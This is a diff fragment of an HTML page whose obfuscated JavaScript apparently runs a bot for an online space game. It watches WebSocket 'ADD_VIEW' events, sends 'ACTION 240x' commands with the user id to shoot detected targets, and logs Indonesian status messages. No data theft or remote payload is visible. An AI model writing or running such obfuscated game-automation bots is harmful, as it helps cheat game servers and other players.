+            _0x373f32[_0x59f850(581)] = _0x373f32[_0x59f850(494)], _0x373f32.value += _0x59f850(462), setTimeout(() => {
+              var _0xe3b03c = _0x59f850;
+              ws[_0xe3b03c(500)](_0xe3b03c(534) + useridg + "\r\n"), shift = 4;
+            }, 1e3);
+          }
+        }
+      }, _0x22c7cf);
+    }
+    if (_0x4e73ac[0] === "ADD_VIEW" && _0x4e73ac[5] === _0xee050f(530)) {
+      var _0x660eab = document[_0xee050f(541)](_0xee050f(487)), _0x458078 = document[_0xee050f(541)](_0xee050f(595)), _0xb9080a = document[_0xee050f(541)](_0xee050f(584)), _0x1a37d9 = document[_0xee050f(541)](_0xee050f(516)), _0x2e7e15 = document[_0xee050f(541)](_0xee050f(446)), _0x127d0a = document[_0xee050f(541)](_0xee050f(548)), _0x34e81a = Math[_0xee050f(563)](Math[_0xee050f(564)]() * 1e3 + 500), _0x1d7e8b = Math[_0xee050f(563)](Math[_0xee050f(564)]() * 1e3 + 2e3);
+      if (_0x458078[_0xee050f(598)]) {
+        if (posslv === 10 || posslv === 11) {
+          if (_0x1a37d9[_0xee050f(598)]) {
+            if (posslv === 10) shift != 3 && (ws[_0xee050f(500)](_0xee050f(580) + useridg + "\r\n"), shift = 3), setTimeout(() => {
+              var _0x105a7b = _0xee050f;
+              ws.send(_0x105a7b(599));
+              var _0x3ad0f9 = document[_0x105a7b(541)]("log");
+              _0x3ad0f9[_0x105a7b(581)] = _0x3ad0f9.scrollHeight, _0x3ad0f9[_0x105a7b(527)] += _0x105a7b(443), ws[_0x105a7b(500)](_0x105a7b(542) + useridg + "\r\n");
+            }, 2500); else posslv === 11 && (shift != 3 && (ws[_0xee050f(500)](_0xee050f(580) + useridg + "\r\n"), shift = 3), setTimeout(() => {
+              var _0x58c692 = _0xee050f;
+              
+              var _0x51e682 = document[_0x58c692(541)](_0x58c692(545));
+              _0x51e682.scrollTop = _0x51e682[_0x58c692(494)], _0x51e682.value += _0x58c692(443), ws[_0x58c692(500)](_0x58c692(542) + useridg + "\r\n");
+            }, 2500));
+          }
+        } else {
+          if (possmg != 0) _0xb9080a[_0xee050f(598)] && (possmg === 1 && (shift != 4 && (ws[_0xee050f(500)]("ACTION 2402 " + useridg + "\r\n"), shift = 4), setTimeout(() => {
+            var _0x1b4320 = _0xee050f;
+            ws[_0x1b4320(500)](_0x1b4320(493));
+            var _0x51eca0 = document[_0x1b4320(541)]("log");
+            _0x51eca0[_0x1b4320(581)] = _0x51eca0[_0x1b4320(494)], _0x51eca0[_0x1b4320(527)] += "Terdeteksi. Upaya menembak..\n", ws[_0x1b4320(500)]("ACTION 2401 " + useridg + "\r\n");
+          }, 2500)), possmg === 2 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+            var _0x364dcd = _0xee050f;
+            ws[_0x364dcd(500)](_0x364dcd(518));
+            var _0x135f1f = document[_0x364dcd(541)](_0x364dcd(545));
+            _0x135f1f[_0x364dcd(581)] = _0x135f1f.scrollHeight, _0x135f1f[_0x364dcd(527)] += _0x364dcd(443), ws[_0x364dcd(500)](_0x364dcd(542) + useridg + "\r\n");
+          }, 2500)), possmg === 3 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+            var _0x3639b6 = _0xee050f;
+            
+            var _0xd63e5b = document[_0x3639b6(541)]("log");
+            _0xd63e5b[_0x3639b6(581)] = _0xd63e5b[_0x3639b6(494)], _0xd63e5b.value += _0x3639b6(443), ws[_0x3639b6(500)](_0x3639b6(542) + useridg + "\r\n");
+          }, 2500)), possmg === 4 && (shift != 4 && (ws[_0xee050f(500)]("ACTION 2402 " + useridg + "\r\n"), shift = 4), setTimeout(() => {
+            var _0x1f2417 = _0xee050f;
+            ws[_0x1f2417(500)](_0x1f2417(451));
+            var _0x12c68b = document[_0x1f2417(541)](_0x1f2417(545));
+            _0x12c68b[_0x1f2417(581)] = _0x12c68b[_0x1f2417(494)], _0x12c68b[_0x1f2417(527)] += _0x1f2417(443), ws[_0x1f2417(500)](_0x1f2417(542) + useridg + "\r\n");
+          }, 2500)), possmg === 5 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+            var _0x325c43 = _0xee050f;
+            ws[_0x325c43(500)](_0x325c43(448));
+            var _0x59e393 = document[_0x325c43(541)](_0x325c43(545));
+            _0x59e393[_0x325c43(581)] = _0x59e393[_0x325c43(494)], _0x59e393[_0x325c43(527)] += "Terdeteksi 5.. Upaya menembak..\n", ws[_0x325c43(500)](_0x325c43(542) + useridg + "\r\n");
+          }, 2500)), possmg === 6 && (shift != 4 && (ws.send(_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+            var _0x12d1eb = _0xee050f;
+            
+            var _0x31fb9f = document[_0x12d1eb(541)]("log");
+            _0x31fb9f[_0x12d1eb(581)] = _0x31fb9f[_0x12d1eb(494)], _0x31fb9f[_0x12d1eb(527)] += "Terdeteksi 4.. Upaya menembak..\n", ws[_0x12d1eb(500)]("ACTION 2401 " + useridg + "\r\n");
+          }, 2500)), possmg === 7 && (shift != 3 && (ws.send(_0xee050f(580) + useridg + "\r\n"), shift = 3), setTimeout(() => {
+            var _0x403346 = _0xee050f;
+            ws[_0x403346(500)](_0x403346(514));
+            var _0x51d214 = document[_0x403346(541)]("log");
+            _0x51d214[_0x403346(581)] = _0x51d214.scrollHeight, _0x51d214.value += _0x403346(443), ws.send(_0x403346(542) + useridg + "\r\n");
+          }, 2500)), possmg === 10 && (shift != 3 && (ws[_0xee050f(500)](_0xee050f(580) + useridg + "\r\n"), shift = 3), setTimeout(() => {
+            var _0x2eb76b = _0xee050f;
+            
+            var _0x663bf = document[_0x2eb76b(541)](_0x2eb76b(545));
+            _0x663bf[_0x2eb76b(581)] = _0x663bf.scrollHeight, _0x663bf[_0x2eb76b(527)] += _0x2eb76b(443), ws[_0x2eb76b(500)](_0x2eb76b(542) + useridg + "\r\n");
+          }, 2500)), possmg === 11 && (shift != 3 && (ws[_0xee050f(500)](_0xee050f(580) + useridg + "\r\n"), shift = 3), setTimeout(() => {
+            var _0x1c512c = _0xee050f;
+            ws[_0x1c512c(500)](_0x1c512c(599));
+            var _0x30abcb = document[_0x1c512c(541)](_0x1c512c(545));
+            _0x30abcb.scrollTop = _0x30abcb[_0x1c512c(494)], _0x30abcb[_0x1c512c(527)] += _0x1c512c(443), ws[_0x1c512c(500)]("ACTION 2401 " + useridg + "\r\n");
+          }, 2500))); else {
+            if (posirn != 0) _0x127d0a[_0xee050f(598)] && (posirn === 1 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+              var _0x22e882 = _0xee050f;
+             
+              var _0x2443e4 = document[_0x22e882(541)]("log");
+              _0x2443e4[_0x22e882(581)] = _0x2443e4[_0x22e882(494)], _0x2443e4[_0x22e882(527)] += _0x22e882(443), ws[_0x22e882(500)](_0x22e882(542) + useridg + "\r\n");
+            }, 2500)), posirn === 2 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+              var _0x2253b1 = _0xee050f;
+              ws[_0x2253b1(500)](_0x2253b1(518));
+              var _0x4f78ec = document[_0x2253b1(541)]("log");
+              _0x4f78ec[_0x2253b1(581)] = _0x4f78ec.scrollHeight, _0x4f78ec[_0x2253b1(527)] += _0x2253b1(443), ws[_0x2253b1(500)](_0x2253b1(542) + useridg + "\r\n");
+            }, 2500)), posirn === 3 && (shift != 4 && (ws.send(_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+              var _0x5cffff = _0xee050f;
+              ws.send(_0x5cffff(490));
+              var _0x4eb249 = document[_0x5cffff(541)](_0x5cffff(545));
+              _0x4eb249[_0x5cffff(581)] = _0x4eb249[_0x5cffff(494)], _0x4eb249[_0x5cffff(527)] += _0x5cffff(443), ws[_0x5cffff(500)]("ACTION 2401 " + useridg + "\r\n");
+            }, 2500)), posirn === 4 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+              var _0x4e5d9b = _0xee050f;
+              ws.send(_0x4e5d9b(451));
+              var _0x8a8305 = document[_0x4e5d9b(541)](_0x4e5d9b(545));
+              _0x8a8305.scrollTop = _0x8a8305.scrollHeight, _0x8a8305[_0x4e5d9b(527)] += "Terdeteksi...\n Upaya menembak..\n", ws.send(_0x4e5d9b(542) + useridg + "\r\n");
+            }, 2500)), posirn === 5 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+              var _0x59808c = _0xee050f;
+              
+              var _0x3c4f00 = document[_0x59808c(541)]("log");
+              _0x3c4f00[_0x59808c(581)] = _0x3c4f00[_0x59808c(494)], _0x3c4f00[_0x59808c(527)] += "Terdeteksi.. Mencoba menembak.\n", ws[_0x59808c(500)](_0x59808c(542) + useridg + "\r\n");
+            }, 2500)), posirn === 6 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+              var _0x554e7d = _0xee050f;
+              ws[_0x554e7d(500)](_0x554e7d(518));
+              var _0x11c0c0 = document[_0x554e7d(541)]("log");
+              _0x11c0c0[_0x554e7d(581)] = _0x11c0c0[_0x554e7d(494)], _0x11c0c0.value += _0x554e7d(443), ws[_0x554e7d(500)](_0x554e7d(542) + useridg + "\r\n");
+            }, 2500)), posirn === 7 && (shift != 3 && (ws[_0xee050f(500)](_0xee050f(580) + useridg + "\r\n"), shift = 3), setTimeout(() => {
+              var _0x2ef090 = _0xee050f;
+              ws.send(_0x2ef090(514));
+              var _0x4793de = document.getElementById(_0x2ef090(545));
+              _0x4793de[_0x2ef090(581)] = _0x4793de[_0x2ef090(494)], _0x4793de[_0x2ef090(527)] += _0x2ef090(443), ws[_0x2ef090(500)](_0x2ef090(542) + useridg + "\r\n");
+            }, 2500)), posirn === 10 && (shift != 3 && (ws[_0xee050f(500)](_0xee050f(580) + useridg + "\r\n"), shift = 3), setTimeout(() => {
+              var _0x4f47b7 = _0xee050f;
+              
+              var _0x2ef6fa = document[_0x4f47b7(541)](_0x4f47b7(545));
+              _0x2ef6fa[_0x4f47b7(581)] = _0x2ef6fa[_0x4f47b7(494)], _0x2ef6fa[_0x4f47b7(527)] += _0x4f47b7(443), ws.send(_0x4f47b7(542) + useridg + "\r\n");
+            }, 2500)), posirn === 11 && (shift != 3 && (ws[_0xee050f(500)]("ACTION 2403 " + useridg + "\r\n"), shift = 3), setTimeout(() => {
+              var _0x5f4a19 = _0xee050f;
+              ws[_0x5f4a19(500)](_0x5f4a19(599));
+              var _0x4070dd = document.getElementById(_0x5f4a19(545));
+              _0x4070dd[_0x5f4a19(581)] = _0x4070dd.scrollHeight, _0x4070dd[_0x5f4a19(527)] += _0x5f4a19(443), ws[_0x5f4a19(500)](_0x5f4a19(542) + useridg + "\r\n");
+            }, 2500))); else posbrz != 0 && (_0x2e7e15[_0xee050f(598)] && (posbrz === 1 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+              var _0x49ca23 = _0xee050f;
+              ws[_0x49ca23(500)](_0x49ca23(493));
+              var _0x17ca0b = document[_0x49ca23(541)](_0x49ca23(545));
+              _0x17ca0b[_0x49ca23(581)] = _0x17ca0b[_0x49ca23(494)], _0x17ca0b[_0x49ca23(527)] += _0x49ca23(443), ws[_0x49ca23(500)](_0x49ca23(542) + useridg + "\r\n");
+            }, 2500)), posbrz === 2 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+              var _0x17e977 = _0xee050f;
+              ws[_0x17e977(500)](_0x17e977(518));
+              var _0x15be83 = document.getElementById(_0x17e977(545));
+              _0x15be83[_0x17e977(581)] = _0x15be83.scrollHeight, _0x15be83[_0x17e977(527)] += _0x17e977(443), ws[_0x17e977(500)](_0x17e977(542) + useridg + "\r\n");
+            }, 2500)), posbrz === 3 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+              var _0x23abb6 = _0xee050f;
+              ws[_0x23abb6(500)](_0x23abb6(490));
+              var _0x385474 = document[_0x23abb6(541)](_0x23abb6(545));
+              _0x385474[_0x23abb6(581)] = _0x385474.scrollHeight, _0x385474[_0x23abb6(527)] += _0x23abb6(443), ws[_0x23abb6(500)](_0x23abb6(542) + useridg + "\r\n");
+            }, 2500)), posbrz === 4 && (shift != 4 && (ws[_0xee050f(500)]("ACTION 2402 " + useridg + "\r\n"), shift = 4), setTimeout(() => {
+              var _0x3f985c = _0xee050f;
+              
+              var _0x35023d = document[_0x3f985c(541)]("log");
+              _0x35023d[_0x3f985c(581)] = _0x35023d.scrollHeight, _0x35023d[_0x3f985c(527)] += _0x3f985c(443), ws.send(_0x3f985c(542) + useridg + "\r\n");
+            }, 2500)), posbrz === 5 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+              var _0x5f2f08 = _0xee050f;
+              ws.send(_0x5f2f08(448));
+              var _0x360843 = document[_0x5f2f08(541)]("log");
+              _0x360843[_0x5f2f08(581)] = _0x360843[_0x5f2f08(494)], _0x360843[_0x5f2f08(527)] += _0x5f2f08(443), ws[_0x5f2f08(500)](_0x5f2f08(542) + useridg + "\r\n");
+            }, 2500)), posbrz === 6 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+              var _0x3065eb = _0xee050f;
+              ws.send(_0x3065eb(518));
+              var _0x5920ec = document.getElementById(_0x3065eb(545));
+              _0x5920ec[_0x3065eb(581)] = _0x5920ec.scrollHeight, _0x5920ec[_0x3065eb(527)] += _0x3065eb(443), ws[_0x3065eb(500)]("ACTION 2401 " + useridg + "\r\n");
+            }, 2500)), posbrz === 7 && (shift != 3 && (ws.send(_0xee050f(580) + useridg + "\r\n"), shift = 3), setTimeout(() => {
+              var _0x529a94 = _0xee050f;
+              
+              var _0x1391db = document[_0x529a94(541)](_0x529a94(545));
+              _0x1391db[_0x529a94(581)] = _0x1391db.scrollHeight, _0x1391db[_0x529a94(527)] += "Terdeteksi.. Upaya menembak..\n", ws[_0x529a94(500)](_0x529a94(542) + useridg + "\r\n");
+            }, 2500)), posbrz === 10 && (shift != 3 && (ws[_0xee050f(500)](_0xee050f(580) + useridg + "\r\n"), shift = 3), setTimeout(() => {
+              var _0x1614c4 = _0xee050f;
+              ws[_0x1614c4(500)](_0x1614c4(599));
+              var _0x17d64f = document[_0x1614c4(541)]("log");
+              _0x17d64f[_0x1614c4(581)] = _0x17d64f.scrollHeight, _0x17d64f[_0x1614c4(527)] += _0x1614c4(443), ws[_0x1614c4(500)](_0x1614c4(542) + useridg + "\r\n");
+            }, 2500)), posbrz === 11 && (shift != 3 && (ws.send(_0xee050f(580) + useridg + "\r\n"), shift = 3), setTimeout(() => {
+              var _0x3d6439 = _0xee050f;
+              ws[_0x3d6439(500)](_0x3d6439(599));
+              var _0x5751c6 = document[_0x3d6439(541)](_0x3d6439(545));
+              _0x5751c6[_0x3d6439(581)] = _0x5751c6[_0x3d6439(494)], _0x5751c6[_0x3d6439(527)] += _0x3d6439(443), ws[_0x3d6439(500)]("ACTION 2401 " + useridg + "\r\n");
+            }, 2500))));
+          }
+        }
+      } else {
+        if (_0x660eab[_0xee050f(598)]) {
+          if (possmg != 0) _0xb9080a.checked && (possmg === 1 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+            var _0x2024b4 = _0xee050f;
+            ws[_0x2024b4(500)](_0x2024b4(483));
+            var _0x44d849 = document[_0x2024b4(541)]("log");
+            _0x44d849[_0x2024b4(581)] = _0x44d849[_0x2024b4(494)], _0x44d849.value += "Terdeteksi. Upaya menembak..\n", ws[_0x2024b4(500)](_0x2024b4(542) + useridg + "\r\n");
+          }, 2500)), possmg === 2 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+            var _0x10b0d8 = _0xee050f;
+            ws.send(_0x10b0d8(514));
+            var _0x27ae0b = document[_0x10b0d8(541)](_0x10b0d8(545));
+            _0x27ae0b[_0x10b0d8(581)] = _0x27ae0b[_0x10b0d8(494)], _0x27ae0b[_0x10b0d8(527)] += _0x10b0d8(443), ws[_0x10b0d8(500)]("ACTION 2401 " + useridg + "\r\n");
+          }, 2500)), possmg === 3 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+            var _0x284b8d = _0xee050f;
+            ws[_0x284b8d(500)](_0x284b8d(490));
+            var _0x496a93 = document[_0x284b8d(541)](_0x284b8d(545));
+            _0x496a93[_0x284b8d(581)] = _0x496a93[_0x284b8d(494)], _0x496a93[_0x284b8d(527)] += _0x284b8d(443), ws[_0x284b8d(500)](_0x284b8d(542) + useridg + "\r\n");
+          }, 2500)), possmg === 7 && (shift != 3 && (ws.send("ACTION 2403 " + useridg + "\r\n"), shift = 3), setTimeout(() => {
+            var _0x213482 = _0xee050f;
+            ws.send(_0x213482(514));
+            var _0x1577bb = document[_0x213482(541)](_0x213482(545));
+            _0x1577bb.scrollTop = _0x1577bb[_0x213482(494)], _0x1577bb.value += _0x213482(443), ws.send(_0x213482(542) + useridg + "\r\n");
+          }, 2500)), possmg === 11 && (shift != 3 && (ws[_0xee050f(500)]("ACTION 2403 " + useridg + "\r\n"), shift = 3), setTimeout(() => {
+            var _0x1e75c8 = _0xee050f;
+            
+            var _0x2beaf6 = document[_0x1e75c8(541)]("log");
+            _0x2beaf6.scrollTop = _0x2beaf6[_0x1e75c8(494)], _0x2beaf6[_0x1e75c8(527)] += _0x1e75c8(443), ws[_0x1e75c8(500)]("ACTION 2401 " + useridg + "\r\n");
+          }, 2500))); else posbrz != 0 && (_0x2e7e15[_0xee050f(598)] && (posbrz === 1 && (shift != 4 && (ws.send("ACTION 2402 " + useridg + "\r\n"), shift = 4), setTimeout(() => {
+            var _0x3ff9d6 = _0xee050f;
+            ws[_0x3ff9d6(500)](_0x3ff9d6(483));
+            var _0x16b65f = document.getElementById(_0x3ff9d6(545));
+            _0x16b65f[_0x3ff9d6(581)] = _0x16b65f[_0x3ff9d6(494)], _0x16b65f[_0x3ff9d6(527)] += "Terdeteksi 2.. Upaya menembak..\n", ws[_0x3ff9d6(500)]("ACTION 2401 " + useridg + "\r\n");
+          }, 2500)), posbrz === 2 && (shift != 4 && (ws[_0xee050f(500)](_0xee050f(534) + useridg + "\r\n"), shift = 4), setTimeout(() => {
+            var _0x2e7245 = _0xee050f;
+            ws[_0x2e7245(500)](_0x2e7245(514));
+            var _0x425de5 = document[_0x2e7245(541)](_0x2e7245(545));
+            _0x425de5[_0x2e7245(581)] = _0x425de5.scrollHeight, _0x425de5[_0x2e7245(527)] += _0x2e7245(443), ws.send(_0x2e7245(542) + useridg + "\r\n");
+          }, 2500)), posbrz === 3 && (shift != 4 && (ws[_0xee050f(500)]("ACTION 2402 " + useridg + "\r\n"), shift = 4), setTimeout(() => {
+            var _0x25a33a = _0xee050f;
+            ws[_0x25a33a(500)](_0x25a33a(490));
+            var _0x227bbf = document[_0x25a33a(541)](_0x25a33a(545));
+            _0x227bbf[_0x25a33a(581)] = _0x227bbf[_0x25a33a(494)], _0x227bbf[_0x25a33a(527)] += "Terdeteksi 1.. Upaya menembak..\n", ws[_0x25a33a(500)]("ACTION 2401 " + useridg + "\r\n");
+          }, 2500)), posbrz === 7 && (shift != 3 && (ws[_0xee050f(500)](_0xee050f(580) + useridg + "\r\n"), shift = 3), setTimeout(() => {
+            var _0x488192 = _0xee050f;
+            
+            var _0xc844f7 = document[_0x488192(541)](_0x488192(545));
+            _0xc844f7.scrollTop = _0xc844f7.scrollHeight, _0xc844f7[_0x488192(527)] += _0x488192(443), ws[_0x488192(500)](_0x488192(542) + useridg + "\r\n");
+          }, 2500)), posbrz === 11 && (shift != 3 && (ws.send(_0xee050f(580) + useridg + "\r\n"), shift = 3), setTimeout(() => {
+            var _0x4779e7 = _0xee050f;
+            
+            var _0xec6468 = document[_0x4779e7(541)](_0x4779e7(545));
+            _0xec6468.scrollTop = _0xec6468[_0x4779e7(494)], _0xec6468[_0x4779e7(527)] += _0x4779e7(443), ws[_0x4779e7(500)]("ACTION 2401 " + useridg + "\r\n");
+          }, 2500))));
+        }
+      }
+    }
+    if (_0x4e73ac[0] === _0xee050f(455)) {
+      curPlanet = _0x4e73ac[1];
+      var _0x3d9b6c = document[_0xee050f(541)](_0xee050f(545));
+      _0x3d9b6c[_0xee050f(581)] = _0x3d9b6c[_0xee050f(494)], _0x3d9b6c.value += _0xee050f(523) + curPlanet + "\n";
+    }
+  };
+}), document.getElementById(_0x285b5e(521))[_0x285b5e(464)]("click", () => {
+  var _0x2ed8bf = _0x285b5e;
+  ws[_0x2ed8bf(500)](_0x2ed8bf(463));
+  var _0x2c5f7b = document[_0x2ed8bf(541)](_0x2ed8bf(545));
+  _0x2c5f7b[_0x2ed8bf(581)] = _0x2c5f7b[_0x2ed8bf(494)], _0x2c5f7b[_0x2ed8bf(527)] += _0x2ed8bf(594);
+}), document[_0x285b5e(541)]("plntgo")[_0x285b5e(464)](_0x285b5e(572), () => {
+  var _0x5e831c = _0x285b5e;
+  ws.send(_0x5e831c(550) + document[_0x5e831c(541)](_0x5e831c(492))[_0x5e831c(527)] + "\r\n");
+  var _0x43aee2 = document[_0x5e831c(541)](_0x5e831c(545));
+  _0x43aee2[_0x5e831c(581)] = _0x43aee2[_0x5e831c(494)], _0x43aee2[_0x5e831c(527)] += _0x5e831c(577) + document[_0x5e831c(541)](_0x5e831c(492))[_0x5e831c(527)] + "\n";
+});
+function GetClock() {
+  var _0x33a73d = _0x285b5e, _0x50e54c = new Date, _0x150598 = _0x50e54c[_0x33a73d(519)](), _0x6b178c = _0x50e54c[_0x33a73d(489)](), _0x34e702 = _0x50e54c.getSeconds();
+  if (_0x6b178c <= 9) _0x6b178c = "0" + _0x6b178c;
+  if (_0x34e702 <= 9) _0x34e702 = "0" + _0x34e702;
+  var _0x127700 = "" + _0x150598 + ":" + _0x6b178c + ":" + _0x34e702 + "";
+  document.getElementById(_0x33a73d(574)).innerHTML = _0x127700;
+}
+GetClock(), setInterval(GetClock, 1e3);
+
+    </script>
+            </section>
+        </article>
+    </main>
+</body>
+
+        </html> 
